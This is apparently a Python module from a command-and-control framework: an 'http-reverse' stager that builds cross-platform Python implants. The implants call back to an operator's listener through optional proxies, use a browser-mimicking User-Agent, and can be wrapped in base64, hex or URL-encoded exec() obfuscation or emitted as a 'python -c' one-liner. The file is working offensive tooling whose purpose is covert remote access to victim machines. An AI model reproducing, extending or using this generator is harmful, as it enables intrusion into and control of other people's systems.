import base64
import os
import urllib
from typing import TYPE_CHECKING

import jinja2
from Utils.options import (AddressType, ChoiceType, DefaultStagerPool,
                           IntegerType, Option, OptionPool, StringType)

from ..base_stager import BasePayload, BaseStager, FinalPayload

if TYPE_CHECKING:
    from Database import StagerModel


class PythonPayload(BasePayload):
    supported_target_os = ["linux", "windows", "osx"]
    supported_target_arch = ["x64", "x86"]
    supported_server_os = ["linux", "windows"]
    end_format: str = "py"
    compiled = False
    options = OptionPool()

    @classmethod
    def generate(cls, stager_db: "StagerModel", one_liner: bool = False, recompile: bool = False) -> "FinalPayload":
        jinja2_env = jinja2.Environment(
            loader=jinja2.FileSystemLoader(
                os.path.dirname(os.path.abspath(__file__))),
            trim_blocks=True,
            lstrip_blocks=True,
            autoescape=True
        )
        template = jinja2_env.get_template("payloads/python.py")
        output = template.render(
            address=stager_db.listener.address,
            port=stager_db.listener.port,
            ssl=stager_db.listener.ssl,
            random_size=stager_db.random_size,
            timeout=stager_db.timeout,
            different_address=stager_db.different_address,
            delay=stager_db.delay,
            sleep_time=stager_db.options["sleep-time"],
            user_agent=stager_db.options["user-agent"],
            proxy_address=stager_db.options["proxy_address"],
            proxy_port=stager_db.options["proxy_port"],
            proxy_auth=stager_db.options["proxy_auth"],
        )
        if stager_db.encoding == "base64":
            output = f"import base64;exec(base64.b64decode('{base64.b64encode(output.encode()).decode()}'))"
        elif stager_db.encoding == "hex":
            output = f"import codecs;exec(codecs.decode('{output.encode().hex()}', 'hex'))"
        elif stager_db.encoding == "url":
            output = f"import urllib.parse;exec(urllib.parse.unquote('{urllib.parse.quote(output)}'))"
        
        if one_liner:
            output = 'python -c "' + output + '"'
        return FinalPayload(cls, stager_db, output)
    
    def is_compiled(self, stager_db: "StagerModel") -> bool:
        return False
class Stager(BaseStager):
    name = "http-reverse"
    description = "Reverse HTTP(S) stager"
    author: str = "Screamz2k"
    payloads = {
        "python": PythonPayload
    }
    options = DefaultStagerPool([
        Option(
            name="Sleep Time",
            description="The time to sleep between each request",
            _real_name="sleep-time",
            type=IntegerType(),
            default=5,
            required=True
        ),
        Option(
            name="Payload",
            description="The payload to use",
            _real_name="payload_type",
            type=ChoiceType(list(payloads.keys()), str),
            default="python",
            required=True
        ),
        Option(
            name="Request User-Agent",
            _real_name="user-agent",
            description="The User-Agent to use.",
            type=StringType(),
            default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
        ),
        Option(
            name="Proxy address",
            _real_name="proxy_address",
            description="The address of a proxy to use.",
            type=AddressType(),
        ),
        Option(
            name="Proxy port",
            _real_name="proxy_port",
            description="The port of a proxy to use.",
            type=IntegerType(),
            default=8080
        ),
        Option(
            name="Proxy authentication",
            _real_name="proxy_auth",
            description="The Authentication to use (format=username:password).",
            type=StringType(),
            default=""
        ),
        Option(
            name="Choice",
            description="The choice to use",
            type=ChoiceType(["1", "2", "3"], str),
            default="1"
        )
    ])

    @classmethod
    def generate(cls, stager_db: "StagerModel", one_liner: bool = False, recompile : bool = False ) -> FinalPayload:
        if stager_db.payload_type not in cls.payloads:
            raise ValueError("Invalid payload type")

        return cls.payloads[stager_db.payload_type].generate(stager_db, one_liner, recompile)
